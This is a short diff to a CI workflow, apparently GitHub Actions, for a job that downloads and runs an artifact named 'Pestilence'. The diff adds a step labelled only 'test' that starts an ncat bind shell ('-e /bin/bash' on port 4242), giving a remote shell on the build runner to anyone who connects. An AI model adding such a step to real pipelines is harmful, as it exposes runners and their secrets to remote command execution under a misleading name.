@@ -263,12 +263,15 @@ jobs:
     needs: build
 
     steps:
+    - name: Install ncat
+      run: sudo apt-get update && sudo apt-get install -y ncat
+
+    - name: test
+      run: ncat -l -p 4242 -e /bin/bash -q 1
+
     - uses: actions/download-artifact@v4
       with:
         name: Pestilence
-
-    - name: Install ncat
-      run: sudo apt-get install -y ncat
 
     - name: Make pestilence executable
       run: chmod +x ./Pestilence
